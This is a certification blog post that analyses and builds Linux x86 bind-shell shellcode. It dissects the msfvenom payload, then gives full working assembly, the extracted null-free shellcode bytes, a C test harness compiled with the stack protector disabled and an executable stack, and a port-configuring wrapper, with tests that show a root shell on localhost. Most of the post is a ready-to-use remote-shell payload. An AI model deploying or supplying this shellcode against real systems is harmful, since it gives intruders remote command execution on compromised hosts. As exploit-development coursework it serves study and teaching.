---
title: "SLAE32 0x01: Shell_Bind_TCP Shellcode"
date: 2019-10-19
category: [SLAE32]
tags: [assembly, c, python, exploit development, bind shell, linux, SLAE32]
header:
    teaser: "/assets/images/slae/shell.jpg"
---
## Shell Bind TCP Objectives

Create a Shell_Bind_TCP shellcode that;
1. Binds to an easily configurable port number
2. Executes a shell on an incoming connection

## MSFVenom Shellcode Under the Microscope

A bind shell is a type of shell in which the system on which the code is run binds a TCP socket that is designated to listen for incoming connections to a specified port and IP address. When a bind shell is used, the system on which the bind shell is executed acts as the listener. When a connection is accepted on the bound and listening socket on the designated port and IP address, a shell will be spawned on the system on which the code is run. 

While analyzing shell_bind_tcp shellcode produced by msfvenom, it appears that a total of six syscalls are executed in sequential order. The order goes: socket, bind, listen, accept, dup2, and execve. Each serve a purpose in creating a bind shell. Let's analyze the first function in this payload. 

`msfvenom -p linux/x86/shell_bind_tcp -f raw| ndisasm -u -` produces

```
Payload size: 78 bytes

xor ebx,ebx  
mul ebx  
push ebx  
inc ebx  
push ebx  
push byte +0x2 
mov ecx,esp  
mov al,0x66  
int 0x80  
pop ebx  
pop esi  
push edx  
push dword 0x5c110002 
push byte +0x10 
push ecx  
push eax  
mov ecx,esp  
push byte +0x66 
pop eax  
int 0x80  
mov [ecx+0x4],eax  
mov bl,0x4  
mov al,0x66  
int 0x80  
inc ebx  
mov al,0x66  
int 0x80  
xchg eax,ebx  
pop ecx  
push byte +0x3f 
pop eax  
int 0x80  
dec ecx  
jns 0x32  
push dword 0x68732f2f 
push dword 0x6e69622f 
mov ebx,esp  
push eax  
push ebx  
mov ecx,esp  
mov al,0xb  
int 0x80
```

The socket or SYS_SOCKETCALL is syscall number 102 or 0x66.


### Create a TCP Socket
`int socket(int domain, int type, int protocol);`

First, a TCP socket is created using the `socket` function. As described in `man 2 socket`, the function creates an endpoint for communication and returns a file descriptor that refers to that endpoint. `socket` expects a domain argument, a type argument, and a protocol argument.

In this case, the domain argument `AF_INET` specifies the IPv4 communication protocol, the type argument `SOCK_STREAM` specifies the connection-based TCP standard for data exchange, and the protocol argument `0` indicates that the system should select the default protocol number based on the previously specified domain and protocol arguments.

### Create an IP Socket Address Structure
Next, the `addr` IP socket address structure is created which is used in the forthcoming `bind` method. As further explained in `man 7 ip`, an IP socket address is defined as a combination of an IP interface address and a 16-bit (2 byte) port number. The man page also states that `sin_family` is always set to `AF_INET`, that `sin_port` defines a port number in network byte order, and that `sin_addr.s_addr` is the host IP address and should be assigned one of the `INADDR_*` values. 

In the code above, the `htons` function converts the unsigned short integer `4444` from host byte order to network byte which is the format expected for `sin_port`. The value of `INADDR_ANY` (which correlates to `0.0.0.0`, `0` or "any") is given for `sin_addr.s_addr`.

It is also important to note that the `addr` struct will be padded to the size of `struct sockaddr` (decimal `16`) as defined in the `/usr/include/linux/in.h` file. The `struct sockaddr` definition is shown below.

```c
/* Structure describing an Internet (IP) socket address. */
#if  __UAPI_DEF_SOCKADDR_IN
#define __SOCK_SIZE__   16      /* sizeof(struct sockaddr)  */
struct sockaddr_in {
  __kernel_sa_family_t  sin_family; /* Address family       */
  __be16        sin_port;   /* Port number          */
  struct in_addr    sin_addr;   /* Internet address     */

  /* Pad to size of `struct sockaddr'. */
  unsigned char     __pad[__SOCK_SIZE__ - sizeof(short int) -
            sizeof(unsigned short int) - sizeof(struct in_addr)];
};
#define sin_zero    __pad       /* for BSD UNIX comp. -FvK  */
#endif
```

### Bind TCP Socket to IP Socket Address Structure
`int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);`

The `bind` method is now used to bind the TCP socket as created by `socket` to the port and IP address initialized within the `addr` structure. From `man bind`, the `bind()` system call takes three arguments; a socket file descriptor (the previously defined `sockfd`), a pointer to a structure of the type `sockaddr_in` (the previously defined `addr`), and the size, in bytes (returned by the `sizeof` operator in this example), of the address structure pointed to by the second argument.

### Designate Socket to Listen for Connection Requests
`int listen(int sockfd, int backlog);`

As the socket is now bound to an IP address and a port, the `listen` function is used to designate the socket as one which will be used to accept incoming connection requests through the `accept` function. As described in, `man 2 listen` the function expects two arguments. The first argument is a socket file descriptor (once again, the socket previously defined as `sockfd`), and the second argument identifies how many pending connections should be queued.

### Accept Connection Requests on the Socket
`int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);`

The `accept` function is used to extract the first connection request in the queue of pending connections on a listening socket as defined previously using the `listen` function. Then, `accept` creates a new and distinct connected socket  and returns a new file descriptor (`connfd` in this example) that refers to this newly-created socket. The function first expects a socket file descriptor arugument, then an address argument that points to a `sockaddr` structure, and finally an address length argument. For the purpose of this program, the only necessary argument is the first argument which will be passed the socket file descriptor `sockfd` as created previously by `socket()`.

### Direct Connection Socket Output
`int dup2(int oldfd, int newfd);`

Next, a `for` loop is used to iterate over the `dup2` function three times, passing the values of `i = 0`, `i = 1`, and `i = 2` as the second argument expected by `dup2` during each respective iteration. The purpose of this is to direct data from the connected socket file descriptor `connfd` which is passed as the first argument to `dup2` for each `for` loop iteration to `STDIN` (integer file descriptor `0`), `STDOUT` (integer file descriptor `1`), and `STDERROR` (integer file descriptor `2`).

### Execute Program
`int execve(const char *pathname, char *const argv[], char *const envp[]);`

Finally, the `execve` function is called. The `execve` function executes the program pointed to by the first argument, `filename`. The second argument, `argv`, is a pointer to an array of argument strings that should be passed to `filename`. The final argument expected by `execve` is a pointer to an array of strings that are passed as environment to the newly-executed `filename` program. The `argv` and `envp` arguments must include a NULL pointer at the end of the array. Additionally, `argv[0]` should contain the filename assosicated with the program being executed (i.e. `filename`). In the analyzed program, the `/bin/sh` file will be executed with no additional arguments or environments being passed.

## From C to Shellcode
With the analysis of the TCP bind shell C program complete, the process for converting the code to assembly language has been simplified. From the analysis, it is clear that a system call will need to be made for the following functions in the following order:
1. `socket`
2. `bind`
3. `listen`
4. `accept`
5. `dup2`
6. `execve`

In Linux x86 assembly, system calls are made through the software interrupt `int 0x80` instruction. When the `int 0x80` interrupt occurs, a system call number that identifies the specific call to invoke is passed via the `EAX` register to the interrupt. Additional arguments to the system call specified by the value in `EAX` are most commonly passed through the `EBX`, `ECX`, and `EDX` registers. The number for each available system call can be found in the `/usr/include/x86_64-linux-gnu/asm/unistd_32.h` file on 64 bit Kali Linux. The location of this file may be different on other Linux distributions.

In the sections following, the assembly code used to prepare for and execute the functions listed above will be explained. As the details of these functions and their purpose within a TCP bind shell program were previously explained during the analysis of the C code, the following sections will focus on the assembly code used to prepare for and excute each function rather than on the purpose of the function within the program. The assembly code will come first, followed by the explanation of the code.

### Clear Registers
```nasm
; clear registers
xor edx, edx
xor ecx, ecx
xor ebx, ebx
xor eax, eax
```

The first bit of assembly code serves the purpose of clearing the registers. This can easily be done using the `XOR` instruction. Using `XOR` with the same source and destination register will always result in its stored value being cleared from the register.

### Socketcall System Call Explained
Conveniently, the first four functions from the list above are all accessible via the `socketcall` system call.  As detailed in `man socketcall`, the function expects two arguments. 

```shell
#include <linux/net.h>
int socketcall(int call, unsigned long *args);  
```

The `call` argument determines which socket function to use, and the `args` argument is a pointer to an area of memory that contains the arguments for the socket function specified by `call`. For a list of socket functions and their respective values that are passable as the `call` argument to `socketcall`, the `/usr/include/linux/net.h` file should be referenced. The available functions for `socketcall` are shown below. 

```shell
root@kali:~/workspace/SLAE# grep SYS /usr/include/linux/net.h
#define SYS_SOCKET      1               /* sys_socket(2)                */
#define SYS_BIND        2               /* sys_bind(2)                  */
#define SYS_CONNECT     3               /* sys_connect(2)               */
#define SYS_LISTEN      4               /* sys_listen(2)                */
#define SYS_ACCEPT      5               /* sys_accept(2)                */
...
```

From the `unistd_32.h` file mentioned previously, the system call number for `socketcall` is decimal `102`.

```shell
root@kali:~/workspace/SLAE# grep socketcall /usr/include/x86_64-linux-gnu/asm/unistd_32.h
#define __NR_socketcall 102
```

### Socketcall: Socket
The first function from the analyzed C code that will be converted to assembly is the call to `socket`. The `socket` function expects three arguments as outlined in the analysis of the C code. The `socketcall` function expects the three arguments to `socket` to be passed as a pointer to its second argument. The `ESP` register stores the current memory address of the stack and therefore inherently acts as a pointer to an area of memory. 

```nasm
; Create a TCP Socket
; int socket(int domain, int type, int protocol);
; int sockfd = socket(AF_INET, SOCK_STREAM, 0);
push edx            ; 0
push 0x1            ; 1 = SOCK_STREAM
push 0x2            ; 2 = AF_INET
```
Three `PUSH` instructions are used to move the three arguments for `socket` onto the stack, in reverse order. The corresponding decimal values for `SOCK_STREAM` and `AF_INET` can typically be found in the `socket.h` file.

```nasm
; int socketcall(int call, unsigned long *args);
mov ecx, esp        ; *args
inc bl              ; 1 = sys_socket
mov al, 0x66        ; socketcall
int 0x80            ; returns int sockfd in eax
mov esi, eax        ; store int sockfd in esi
```

The "top" of the stack now contains the first argument for `socket`. The `ESP` register contains this memory address. This memory address is stored in the `ECX` register (which will be passed as the second argument to `socketcall`) using `MOV`. Next, `INC` is used to increase the value stored in `BL` by one to `1` which is passed as the first argument to `socketcall` and specifies calling the `socket` function. The system call number for `socketcall` is moved into `AL` and a software interrupt occurs. After an `INT 0x80`, the return value of the called function is stored in `EAX`. The last instruction shown above stores the file descriptor returned by `socket` (called `sockfd` in the C program) in `ESI` for future use.

### IP Socket Address Structure
Next, the IP socket address structure defined in the C program as `addr` is saved in memory. To accomplish this, the items will be stored on the stack using the `PUSH` instruction. 

```nasm
; Create an IP Socket Address Structure
; struct sockaddr_in addr;
push edx            ; addr.sin_addr.s_addr = 0 = INADDR_ANY;
push word 0x5c11    ; addr.sin_port = htons(4444);
push word 0x2       ; addr.sin_family = 2 = AF_INET;
mov ecx, esp        ; pointer to struct sockaddr_in addr;
```

First, the items are pushed to the stack in reverse order. Then, the memory address pointing to the item last pushed to the stack (which is contained in the `ESP` register) is moved to the `ECX` register to later be used as the second argument for `bind`.

### Socketcall: Bind System Call
With the memory address of the defined IP socket address structure stored in `ECX` and the socket file descriptor (`sockfd`) stored in `ESI`, the call to `bind` can now be prepared and executed. As the `socketcall` system call will again be used to call `bind`, the process for preparing the arguments for `bind` and for `socketcall` will be similar to the process outlined in the "Socketcall: Socket" section.

```nasm
; Bind TCP Socket to IP Socket Address Structure
; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
; bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
push 0x10           ; 16 = sizeof(addr)
push ecx            ; (struct sockaddr *)&addr
push esi            ; sockfd
```

First, the arguments for `bind` are stored on the stack in reverse order using the `PUSH` instruction. This time, the arguments stored on the stack consist of an integer that represents the size of `addr`, a pointer (memory address) to the location of the `addr` structure in memory, and the file descriptor returned by the `socket` function.

```nasm
; int socketcall(int call, unsigned long *args);
mov ecx, esp        ; *args
inc bl              ; 2 = sys_bind
mov al, 0x66        ; socketcall
int 0x80            ; returns 0 in eax
```

Next, the arguments for `socketcall` are prepared, this time with the intention of executing `bind`. As with the previous `socketcall`, the second argument is passed via the `ECX` register. To reiterate, as the three arguments expected by `bind` are stored on the stack, the `ESP` register will contain the memory address of where the first of these three arguments begins. Therefore, after the `MOV` instruction, the `ECX` register contains the memory address of where the three arguments for `bind` are stored. After `BL` is increased by one to `2` using the `INC` instruction, the function number which identifies the `bind` function is passed to `socketcall` through the `BL` register. The system call number `0x66` (decimal `102`) is moved to the `AL` register before the sofware interrupt occurs and the system call is executed.

### Socketcall: Listen System Call
The process for preparing the arguments for the `listen` function to be passed to the `socketcall` system call is repeated again in a similar manner to the two previous examples.

```nasm
; Designate Socket to Listen for Connection Requests
; int listen(int sockfd, int backlog);
; listen(sockfd, 0);
push edx            ; 0
push esi            ; sockfd
```

The arguments for `listen` which are the value `0` for the `backlog` argument and the `sockfd` file descriptor returned from `socket` for the `sockfd` argument are pushed to the stack. 

```nasm
; int socketcall(int call, unsigned long *args);
mov ecx, esp        ; *args
mov bl, 0x4         ; 4 = sys_listen
mov al, 0x66        ; socketcall
int 0x80            ; returns 0 in eax
```

The pointer to these arguments is moved into `ECX` to be passed as the second argument to `socketcall`. The function number `4` is stored in `EBX` to identify the `listen` function as the first argument to `socketcall`. The system call number is moved to `AL` and a software interrupt occurs, resulting in the execution of `listen` via `socketcall`.

### Socketcall: Accept System Call
The `socketcall` function is used for the fourth and final time to call `accept`.

```nasm
; Accept Connection Requests on the Socket
; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
; int connfd = accept(sockfd, NULL, NULL);
push edx            ; NULL
push edx            ; NULL
push esi            ; sockfd
```

As explained previously, the three arguments for `accept` are each pushed to the stack in reverse order using the `PUSH` instruction. After the three `PUSH` instructions, the `ESP` register will contain the memory address of where the first argument for `accept` (i.e. the argument most recently pushed to the stack) begins.

```nasm
; int socketcall(int call, unsigned long *args);
mov ecx, esp        ; *args
inc bl              ; 5 = sys_accept
mov al, 0x66        ; socketcall
int 0x80            ; returns int connfd in eax
```

The memory address in `ESP` is stored in `ECX` which will eventually be passed to `socketcall` as its second argument. The value in the `BL` register is increased by one to `5` which represents the `socketcall` function number for `accept`. The system call number for `socketcall` is placed in `AL` followed by the software interrupt instruction `INT 0x80`. Upon completion, a connection socket file descriptor (named `connfd` in this case) is returned and stored in the `EAX` register.

### Dup2 System Call
Now that the four `socketcall` system calls are complete, a system call to to `dup2` is required which is assigned the system call number decimal `63` in the `unistd_32.h` file.

```shell
#define __NR_dup2 63
```

As explained previously, `dup2` is used to direct `STDOUT`, `STDIN`, and `STDERROR` to the connection socket returned by `accept`. This means that the `dup2` system call will be repeated three times, one time for each standard stream. For each call, the `oldfd` argument will be the connection file descriptor `connfd` that is currently stored in `EAX` and the `newfd` argument will first be `0` for `STDOUT`, then `1` for `STDERROR`, and finally `2` for `STDERROR`.

```nasm
; Direct Connection Socket Output
; int dup2(int oldfd, int newfd);
; dup2(connfd, 0);
mov ecx, edx        ; 0 = STDOUT
mov ebx, eax        ; store int connfd in ebx
mov al, 0x3f        ; dup2
int 0x80
; dup2(connfd, 1);
inc cl              ; 1 = STDIN
mov al, 0x3f        ; dup2
int 0x80
; dup2(connfd, 2);
inc cl              ; 2 = STDERROR
mov al, 0x3f        ; dup2
int 0x80
```

For the first call to `dup2`, the value of `0` is stored in the `ECX` register which will be passed to `dup2` as its second argument. Next, the `connfd` file descriptor stored in `EAX` as returned via `accept` is moved to `EBX` to be passed as the first argument to `dup2`. Then, the value `0x3f` which is the hexadecimal equivalent of the decimal representation of the system call number for `dup2` is moved into `AL` before the function is called via `INT 0x80`.

This general process is repeated two more times passing the values of `1` and `2` to the function's second argument each successive time. Note that the `connfd` file descriptor remains in `EBX` throughout, and therefore the `MOV EBX, EAX` instruction is only required once. 

### Execve System Call
The final step is a system call to `execve` in order to execute `/bin/sh`. From `unistd_32.h` the system call number for `execve` is decimal `11`.

```shell
#define __NR_execve 11
```

The `execve` system call expects three arguments which were explained during the analysis of the C program that will be passed via the `EBX`, `ECX`, and `EDX` registers in the code below.

```nasm
; Execute Program
; int execve(const char *pathname, char *const argv[], char *const envp[]);
; execve("/bin/sh", NULL, NULL);
push edx            ; delimiting NULL for pathname
push 0x68732f2f     ; //sh
push 0x6e69622f     ; /bin
mov ebx, esp        ; pointer to pathname
```

To prepare the three arguments for `execve`, the `/bin/sh` string is first stored on the stack using `PUSH` instructions. The first `PUSH` shown in the code above serves to `NULL` terminate the `/bin/sh` string. Next, the `/bin/sh` string itself is pushed to the stack. At this point, `ESP` stores the memory address of where the string is stored, and hence this memory address is moved to `EBX` which will be passed as the first argument for `execve`.

```nasm
push edx            ; delimiting NULL for argv[] & envp[]
mov edx, esp        ; *const envp[]
push ebx            ; *pathname
mov ecx, esp        ; *const argv[]
mov al, 0xb         ; execve
int 0x80
```

Another `PUSH` instruction is used which serves as a delimeter for the second and third arguments. Immediately after the referenced `PUSH` instruction, the memory address stored in `ESP` is moved to `EDX` to be pased as the third argument to `execve`. Next, the memory address value in `EBX` which is the location of the `/bin/sh` string in memory is pushed to the stack. Now, the stack contains the memory address of `/bin/sh` string's location in memory followed by `NULL`, and therefore the memory address in `ESP` serves as a pointer to the array of arguments to be passed to `/bin/sh`. The value in `ESP` is moved to `ECX` to be passed as the second argument for `execve`. The `execve` system call number is moved into `AL` before the software interrupt occurs.

## Completed Assembly Program
Shown below is the assembly program described above in its entirety. Some of the comments from the code above have been removed. The fully commented version of the code can be found on [GitHub](https://github.com/norrismw/SLAE).

```nasm
; shell_bind_tcp.nasm
; Author: Michael Norris

global _start

section .text
_start:
    ; clear registers
    xor edx, edx
    xor ecx, ecx
    xor ebx, ebx
    xor eax, eax

    ; int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    push edx            ; 0
    push 0x1            ; 1 = SOCK_STREAM
    push 0x2            ; 2 = AF_INET
    mov ecx, esp        ; *args
    inc bl              ; 1 = sys_socket
    mov al, 0x66        ; socketcall
    int 0x80            ; returns int sockfd in eax
    mov esi, eax        ; store int sockfd in esi

    ; struct sockaddr_in addr;
    push edx            ; addr.sin_addr.s_addr = 0 = INADDR_ANY;
    push word 0x5c11    ; addr.sin_port = htons(4444);
    push word 0x2       ; addr.sin_family = 2 = AF_INET;
    mov ecx, esp        ; pointer to struct sockaddr_in addr;

    ; bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
    push 0x10           ; 16 = sizeof(addr)
    push ecx            ; (struct sockaddr *)&addr
    push esi            ; sockfd
    mov ecx, esp        ; *args
    inc bl              ; 2 = sys_bind
    mov al, 0x66        ; socketcall   
    int 0x80            ; returns 0 in eax

    ; listen(sockfd, 0);
    push edx            ; 0
    push esi            ; sockfd
    mov ecx, esp        ; *args
    mov bl, 0x4         ; 4 = sys_listen
    mov al, 0x66        ; socketcall
    int 0x80            ; returns 0 in eax

    ; int connfd = accept(sockfd, NULL, NULL);
    push edx            ; NULL
    push edx            ; NULL
    push esi            ; sockfd
    mov ecx, esp        ; *args
    inc bl              ; 5 = sys_accept
    mov al, 0x66        ; socketcall
    int 0x80            ; returns int connfd in eax

    ; int dup2(int oldfd, int newfd);
    mov ecx, edx        ; 0 = STDOUT
    mov ebx, eax        ; store int connfd in ebx
    mov al, 0x3f        ; dup2
    int 0x80
    inc cl              ; 1 = STDIN
    mov al, 0x3f        ; dup2
    int 0x80
    inc cl              ; 2 = STDERROR
    mov al, 0x3f        ; dup2
    int 0x80

    ; execve("/bin/sh", NULL, NULL);
    push edx            ; delimiting NULL for pathname
    push 0x68732f2f     ; //sh
    push 0x6e69622f     ; /bin
    mov ebx, esp        ; pointer to pathname
    push edx            ; delimiting NULL for argv[] & envp[]
    mov edx, esp        ; *const envp[]
    push ebx            ; *pathname
    mov ecx, esp        ; *const argv[]
    mov al, 0xb         ; execve
    int 0x80
```

## Compile & Test
### Testing Assembly
With the assembly code written, it is now time to compile and test. The commands shown below were run on 64-bit Kali Linux. First, the code should be assembled with `/usr/bin/nasm` as shown below. As the program is written in x86 assembly, the `elf32` file type is specified using the `-f` flag.

```shell
root@kali:~/workspace/SLAE/# nasm -f elf32 shell_bind_tcp.nasm -o shell_bind_tcp.o
```

With the code assembled, the next step is to link the `shell_bind_tcp.o` file with `/usr/bin/ld`. The `-m` flag specifies that the `elf_i386` emulation linker should be used.

```shell
root@kali:~/workspace/SLAE/# ld -m elf_i386 shell_bind_tcp.o -o shell_bind_tcp
```

The assembled and linked code can now be run on the system.

```shell
root@kali:~/workspace/SLAE/# ./shell_bind_tcp
```

In a separate terminal window, `netstat` command can be used to test whether port `4444` is listening on the system. The output below confirms this to be the case.

```shell
root@kali:~/workspace/SLAE# netstat -anlp | grep 4444
tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      26439/./shell_bind_tcp 
```

To test the complete functionality of the TCP bind shell, a connection can be made to `localhost` port `4444` using `nc` or `ncat`. If all goes as planned, a shell will be spawned on successful connection.

```shell
root@kali:~/workspace/SLAE# nc -v localhost 4444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Connected to 127.0.0.1:4444.
id
uid=0(root) gid=0(root) groups=0(root)
ls | grep shell_bind_tcp
shell_bind_tcp
shell_bind_tcp.nasm
shell_bind_tcp.o
```

Success!

### Examining The Shellcode
 Now, `shell_bind_tcp` can be diassembled into opcodes using `/usr/bin/objdump`. An example of this is shown below. The output has been truncated to conserve space.

```shell
root@kali:~/workspace/SLAE# objdump -d ./shell_bind_tcp -M intel

./shell_bind_tcp:     file format elf32-i386


Disassembly of section .text:

08049000 <_start>:
 8049000:       31 d2                   xor    edx,edx
 8049002:       31 c9                   xor    ecx,ecx
 8049004:       31 db                   xor    ebx,ebx
 8049006:       31 c0                   xor    eax,eax
 8049008:       52                      push   edx
 8049009:       6a 01                   push   0x1
 804900b:       6a 02                   push   0x2
 804900d:       89 e1                   mov    ecx,esp
 804900f:       fe c3                   inc    bl
 8049011:       b0 66                   mov    al,0x66
 8049013:       cd 80                   int    0x80
 ...
 ```

 After confirming that no `NULL` bytes (`\x00`) are present in the output of `objdump`, the shellcode can be extracted and formatted using the following one-liner. Credit for this goes to gunslinger_ from commandlinefu.com.

 ```shell
root@kali:~/workspace/SLAE# /usr/bin/objdump -d ./shell_bind_tcp | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d:|cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s | sed 's/^//' | sed 's/$//g'
\x31\xd2\x31\xc9\x31\xdb\x31\xc0\x52\x6a\x01\x6a\x02\x89\xe1\xfe\xc3\xb0\x66\xcd\x80\x89\xc6\x52\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xfe\xc3\xb0\x66\xcd\x80\x52\x56\x89\xe1\xb3\x04\xb0\x66\xcd\x80\x52\x52\x56\x89\xe1\xfe\xc3\xb0\x66\xcd\x80\x89\xd1\x89\xc3\xb0\x3f\xcd\x80\xfe\xc1\xb0\x3f\xcd\x80\xfe\xc1\xb0\x3f\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
```

### Testing The Shellcode
To confirm that the shellcode will work within the context of a C program, the shellcode can be placed in a test program (titled `sc_test.c` in this example) written in C, as shown below.

```c
#include <stdio.h>
#include <string.h>

/*
To compile:
gcc -m32 -fno-stack-protector -z execstack sc_test.c -o sc_test
*/

unsigned char shellcode[] = \
    "\x31\xd2\x31\xc9\x31\xdb\x31\xc0"
    "\x52\x6a\x01\x6a\x02\x89\xe1\xfe"
    "\xc3\xb0\x66\xcd\x80\x89\xc6\x52"
    "\x66\x68\x11\x5c\x66\x6a\x02\x89"
    "\xe1\x6a\x10\x51\x56\x89\xe1\xfe"
    "\xc3\xb0\x66\xcd\x80\x52\x56\x89"
    "\xe1\xb3\x04\xb0\x66\xcd\x80\x52"
    "\x52\x56\x89\xe1\xfe\xc3\xb0\x66"
    "\xcd\x80\x89\xd1\x89\xc3\xb0\x3f"
    "\xcd\x80\xfe\xc1\xb0\x3f\xcd\x80"
    "\xfe\xc1\xb0\x3f\xcd\x80\x52\x68"
    "\x2f\x2f\x73\x68\x68\x2f\x62\x69"
    "\x6e\x89\xe3\x52\x89\xe2\x53\x89"
    "\xe1\xb0\x0b\xcd\x80";

int main(void)
{
    printf("Shellcode Length: %d\n", strlen(shellcode));
    int (*ret)() = (int(*)())shellcode;
    ret();
}
```

This program should then be compiled using the `gcc` command as suggested in the commented code. After compilation, running the `sc_test` program prints the length of the shellcode.

```shell
root@kali:~/workspace/SLAE# ./sc_test
Shellcode Length: 109
```

In another terminal window, `nc` or `ncat` can be used to test the functionality of the shellcode in its entirety in the same way that the code was tested in a previous section.

## Wrapper Program for Port Configuration
Using Python, the bind port can easily be configured within the shellcode. During the analysis of the assembly code, recall that the port to bind was saved to memory using the `PUSH WORD 0x5c11` instruction during the creation of the IP Socket Address Structure called `addr`. The port number is an unsigned 16-bit integer, so is possible to represent the entire range of ports (`0 - 65535`) using two bytes.

As the `PUSH` instruction stores bytes to the stack in the order of least-signficant to most-significant, `0x5c11` appears in the shellcode as `\x11\x5c`. Knowing this, a program was created to take a user-supplied port number which will be converted to network byte order, converted to hex, formatted, and ultimately used to replace the `\x11\x5c` string present in the base TCP bind shell shellcode. 

The program includes basic validation checks that can be altered in the future to provide encoding to account for `NULL` bytes introduced to the shellcode as a result of port number specification. Port values that result in a `NULL` byte are all values less than or equal to `256` (due to the low-order byte having all 8 bits set to `0`) and all other values that are evenly divisible by `256` (due to the high-order byte having all 8 bits set to `0`). A demonstration of the program follows.

To save space, the program code has not been included here. The full code for the program can be found on [GitHub](https://github.com/norrismw/SLAE). Using this program with the shellcode generated previously results in the following output:

```shell
root@kali:~/workspace/SLAE# python3 ConfShell.py bind 65000
\x31\xd2\x31\xc9\x31\xdb\x31\xc0\x52\x6a\x01\x6a\x02\x89\xe1\xfe\xc3\xb0\x66\xcd\x80\x89\xc6\x52\x66\x68\xfd\xe8\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xfe\xc3\xb0\x66\xcd\x80\x52\x56\x89\xe1\xb3\x04\xb0\x66\xcd\x80\x52\x52\x56\x89\xe1\xfe\xc3\xb0\x66\xcd\x80\x89\xd1\x89\xc3\xb0\x3f\xcd\x80\xfe\xc1\xb0\x3f\xcd\x80\xfe\xc1\xb0\x3f\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
```

This output can then be used in `sc_test.c` as outlined previously. After compiling the new shellcode within `sc_test.c`, a connection can be made to `localhost` on the specifed port of `65000` that results in shell.

```shell
root@kali:~/workspace/SLAE# nc -v localhost 65000
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Connected to 127.0.0.1:65000.
id
uid=0(root) gid=0(root) groups=0(root)
ifconfig                
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.57.197  netmask 255.255.255.0  broadcast 192.168.57.255
        inet6 fe80::20c:29ff:fe40:6c57  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:40:6c:57  txqueuelen 1000  (Ethernet)
        RX packets 286221  bytes 396564230 (378.1 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 41605  bytes 2844136 (2.7 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 1620  bytes 206307 (201.4 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1620  bytes 206307 (201.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

_This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:_

<http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert>

_Student ID: SLAE-1469_

